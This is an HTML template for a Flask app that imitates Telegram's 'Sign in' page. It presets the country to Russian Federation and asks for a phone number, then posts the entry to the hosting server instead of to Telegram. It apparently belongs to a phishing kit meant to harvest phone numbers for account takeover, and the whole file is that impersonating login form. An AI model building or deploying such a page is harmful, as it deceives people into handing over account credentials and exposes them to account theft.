<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to Telegram</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="container">
        <h2>Sign in to Telegram</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        <form method="post">
            <label>Country</label><br>
            <input type="text" value="Russian Federation" disabled><br>
            <label>Phone Number</label><br>
            <input type="text" name="phone" placeholder="+7 --- --- --- ---" required><br><br>
            <button type="submit">NEXT</button>
        </form>
    </div>
</body>
</html>
